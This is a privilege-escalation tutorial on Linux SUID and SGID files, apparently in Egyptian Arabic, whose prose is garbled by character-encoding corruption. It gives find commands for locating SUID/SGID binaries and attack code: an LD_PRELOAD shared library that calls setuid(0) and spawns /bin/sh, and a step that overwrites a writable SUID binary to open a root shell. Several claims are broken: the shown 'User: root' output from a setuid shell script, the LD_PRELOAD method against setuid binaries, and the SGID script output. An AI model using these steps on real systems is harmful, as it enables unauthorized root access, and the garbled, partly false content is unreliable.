## ๐ฅ **SUID / SGID - ููู ุฃุนูู ูุน ุงุณุชุบูุงู ุนููู**

ููุบุทู ููุง:  
โ **ุฅุฒุงู SUID ู SGID ุจูุดุชุบููุง ูุนูููุงุ**  
โ **ุทุฑู ุงูุจุญุซ ุนููู ูู ุงููุธุงู ุจุงุณุชุฎุฏุงู ุฃูุงูุฑ ุนูููุฉ**  
โ **ูู ุงูุทุฑู ุงููู ุชูุฏุฑ ุชุณุชุบู ุจููุง ูููุงุช SUID ู SGID**  
โ **ุชุดุบูู ุฃููุงุฏ ุงุณุชุบูุงู ูุนููุฉ ูุฑูุน ุงูุตูุงุญูุงุช**

---

## ๐ **1. SUID ู SGID - ุดุฑุญ ุนููู ูุน ุชุฌุงุฑุจ**

### ๐ **SUID (Set User ID) - ูุนูู ุฅูู ุนููููุงุ**

ููุง ูููู `SUID` ูุชูุนูู ุนูู ููู ุชูููุฐูุ ููุนูุงู ุฅู ุฃู ุญุฏ ูุดุบููู **ููุชููุฐ ุจุตูุงุญูุงุช ูุงูู ุงูููู ุจุฏู ูู ุตูุงุญูุงุช ุงููุณุชุฎุฏู ุงูุนุงุฏู**.

#### ๐ฅ **ุชุฌุฑุจุฉ ุนูููุฉ - ุฅูุดุงุก ููู SUID**

ููุนูู ููู ุจุณูุท ููุดูู ุงููุฑู ูุจู ูุจุนุฏ ุฅุถุงูุฉ `SUID`:

```bash
# ุฅูุดุงุก ููู ุชูููุฐู ุจุณูุท
echo -e '#!/bin/bash\necho "User: $(whoami)"' > suid_test.sh
chmod +x suid_test.sh

# ุชุดุบููู ููุณุชุฎุฏู ุนุงุฏู
./suid_test.sh
```

**ุงููุฎุฑุฌุงุช ูุชููู:**

```bash
User: user  # ุจูุชููุฐ ุจุตูุงุญูุงุช ุงููุณุชุฎุฏู ุงูุนุงุฏู
```

#### โ **ุฅุถุงูุฉ SUID**

ููุบููุฑ ููููุฉ ุงูููู ููุถูู `SUID`:

```bash
sudo chown root:root suid_test.sh
sudo chmod u+s suid_test.sh
ls -l suid_test.sh
```

**ุงููุฎุฑุฌุงุช:**

```bash
-rwsr-xr-x 1 root root 20 Mar 24 00:00 suid_test.sh
```

ูุงุญุธ ุงูุญุฑู `s` ูู ุงูุชุตุงุฑูุญ (`rwsr-xr-x`)ุ ุฏู ูุนูุงู ุฅู `SUID` ููุนูู.

#### ๐ **ุชุดุบููู ุจุนุฏ ุฅุถุงูุฉ SUID**

```bash
./suid_test.sh
```

**ุงููุฎุฑุฌุงุช ูุชููู:**

```bash
User: root  # ุฑุบู ุฅููุง ูุดุบูููู ุจูุณุชุฎุฏู ุนุงุฏูุ ุงุดุชุบู ุจุตูุงุญูุงุช root!
```

### ๐ฅ **SGID (Set Group ID) - ูุนูู ุฅูู ุนููููุงุ**

ููุณ ููุฑุฉ `SUID`ุ ููู ุจุฏู ูุง ุงูููู ูุชููุฐ ุจุตูุงุญูุงุช ูุงูู ุงููููุ ุจูุชููุฐ ุจุตูุงุญูุงุช **ุงููุฌููุนุฉ ุงููุงููุฉ ููููู**.

#### โ **ุฅุถุงูุฉ SGID ุนูู ููู**

```bash
sudo chown root:staff suid_test.sh
sudo chmod g+s suid_test.sh
ls -l suid_test.sh
```

**ุงููุฎุฑุฌุงุช:**

```bash
-rwxr-sr-x 1 root staff 20 Mar 24 00:00 suid_test.sh
```

ุงูุญุฑู `s` ูู `rwxr-sr-x` ูุนูุงู ุฅู `SGID` ููุนูู.

#### ๐ **ุชุดุบููู ุจุนุฏ ุฅุถุงูุฉ SGID**

```bash
./suid_test.sh
```

**ุงููุฎุฑุฌุงุช:**

```bash
Group: staff  # ุงูููู ุงุชููุฐ ุจุตูุงุญูุงุช ุงููุฌููุนุฉ staff
```

---

### ๐ข **๐ก ุงูุฎูุงุตุฉ (ุจุงููุตุฑู)**

- `SUID` ุจูุฎูู ุฃู ููู ุชูููุฐู ูุดุชุบู ุจุตูุงุญูุงุช **ุตุงุญุจ ุงูููู** ูุด ุงููุณุชุฎุฏู ุงููู ุดุบููู.
- `SGID` ุจูุฎูู ุฃู ููู ูุดุชุบู ุจุตูุงุญูุงุช **ุงููุฌููุนุฉ ุงููุงููุฉ** ููููู.
- ูู ูููุช ููู ุนูุฏู `SUID` ููุชูููู ูู `root`ุ ุชูุฏุฑ ุชุญุงูู ุชุณุชุบูู ุนุดุงู ุชุงุฎุฏ ุตูุงุญูุงุช `root`.

---

## ๐ **2. ุงูุจุญุซ ุนู ูููุงุช SUID ู SGID ูู ุงููุธุงู**

### โ **ุงูุจุญุซ ุนู ูู ูููุงุช SUID ูู ุงููุธุงู**

```bash
find / -type f -perm -u+s 2>/dev/null
```

**ุฏู ุจุชุฏูุฑ ุนูู ูู ุงููููุงุช ุงููู ุนูุฏูุง `SUID` ููุนูู.**

### โ **ุงูุจุญุซ ุนู ูู ูููุงุช SGID ูู ุงููุธุงู**

```bash
find / -type f -perm -g+s 2>/dev/null
```

**ุฏู ุจุชุฏูุฑ ุนูู ูู ุงููููุงุช ุงููู ุนูุฏูุง `SGID` ููุนูู.**

### โ **ุงูุจุญุซ ุนู ูููุงุช SUID ุฃู SGID ูุน ุชูุงุตูู ุงูุชุตุงุฑูุญ**

```bash
find / -type f \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2>/dev/null
```

**ููุนุฑุถ ูู ุงููููุงุช ูุน ุงูุชุตุงุฑูุญ ุจุชุงุนุชูุง ุนุดุงู ุชุดูู ุจุณูููุฉ ุฅูู ุงููู ูููู ูููู ูุงุจู ููุงุณุชุบูุงู.**

### โ **ุงูุจุญุซ ุนู ูููุงุช SUID/SGID ููุณุชุฎุฏู ูุนูู (ูุซูุงู root)**

```bash
find / -user root -type f \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2>/dev/null
```

**ุฏู ุจุชุฏูุฑ ุนูู ุฃู ููู SUID ุฃู SGID ููููู ูู `root`.**

---

### ๐ข **๐ก ุงูุฎูุงุตุฉ (ุจุงููุตุฑู)**

- ุงุณุชุฎุฏู `find` ุนุดุงู ุชุฏูุฑ ุนูู ุงููููุงุช ุงููู ูููู ุชุณุชุบููุง.
- ุฑููุฒ ุนูู ุงููููุงุช ุงููู ูููููุฉ ูู `root`ุ ูุฃููุง ูููู ุชุฏูู ุตูุงุญูุงุช `root`.
- ุฏุงูููุง ุดูู ุงูุชุตุงุฑูุญ ุจุชุงุนุช ุงููููุงุช (`ls -l`) ุนุดุงู ุชุชุฃูุฏ ุฅููุง ูุงุจูุฉ ููุงุณุชุบูุงู.

---

## ๐ **3. ูู ุงูุทุฑู ุงูููููุฉ ูุงุณุชุบูุงู ูููุงุช SUID**

ูู ูููุช ููู `SUID` ููููู ูู `root`ุ ุนูุฏู ูุฐุง ุทุฑููุฉ ููุงุณุชุบูุงู:

### ๐ฅ **1. ุชุดุบูู ุดูู ูุจุงุดุฑุฉ**

ูู ุงูููู ุจูุฏูู **ุดูู (`shell`) ุชูุงุนูู**ุ ูููู ุชุนูู ุงูุขุชู:

```bash
/path/to/suid_binary
whoami
```

ูู `whoami` ุฑุฌูุน `root`ุ ูุจูู ุงูุงุฎุชุฑุงู ูุงุฌุญ.

### ๐ฅ **2. ุชุดุบูู ุฃูุฑ ูุนูู ุจุตูุงุญูุงุช `root`**

ุจุนุถ ูููุงุช `SUID` ุจุชุณูุญ ูู ุชูููุฐ ุฃูุงูุฑ:

```bash
/path/to/suid_binary -c "id"
```

**ูู ุงูุฃูุฑ ุงุชููุฐ ุจุตูุงุญูุงุช `root`ุ ูุจูู ููู ุงุณุชุบูุงู.**

### ๐ฅ **3. ุชุนุฏูู ูุชุบูุฑุงุช ุงูุจูุฆุฉ (`LD_PRELOAD`)**

ูู ุงูููู ุจูุณุชุฎุฏู ููุชุจุฉ ุฏููุงููููุฉุ ูููู ูุญุท ููุชุจุฉ ุงุญูุง ุนุงูููููุง ููุญุตู ุนูู `root`:

```bash
echo -e '#include <stdio.h>\n#include <stdlib.h>\nvoid _init() { setgid(0); setuid(0); system("/bin/sh"); }' > exploit.c
gcc -shared -o exploit.so -fPIC exploit.c
LD_PRELOAD=./exploit.so /path/to/suid_binary
```

ุฏู ููุดุบูู `shell` ุจุตูุงุญูุงุช `root`.

### ๐ฅ **4. ุงุณุชุบูุงู ุงููููุงุช ุงููุงุจูุฉ ูููุชุงุจุฉ**

ูู ุงูููู ุนูุฏู `SUID` **ูููู ูุงุจู ููุชุนุฏูู (`writable`)**ุ ูููู ุชุนุฏูู ุนููู ูุชุถูู ููุฏ ุชุดุบูู `sh`.

```bash
echo -e '#!/bin/bash\n/bin/bash' > /path/to/suid_binary
chmod +x /path/to/suid_binary
/path/to/suid_binary
```

---

### ๐ข **๐ก ุงูุฎูุงุตุฉ (ุจุงููุตุฑู)**

- ุฌุฑุจ ุชุดุบู ุงูููู ูุชุดูู ุตูุงุญูุงุชู (`whoami`).
- ูู ุจููุจู ุฃูุงูุฑุ ุฌุฑุจ `id` ุฃู `bash`.
- ุงุณุชุฎุฏู **`LD_PRELOAD`** ูู ุงูููู ุจูุณุชุฎุฏู ููุชุจุงุช ุฏููุงููููุฉ.
- ูู ุงูููู ูุงุจู ูููุชุงุจุฉุ ุนุฏููู ูุฎููู ููุชุญ `sh`.

๐ฅ **ูุฏู ุนูุฏู ูู ุงูุทุฑู ุงูููููุฉ ูุงุณุชุบูุงู SUID ู SGID ูุฑูุน ุงูุตูุงุญูุงุช!**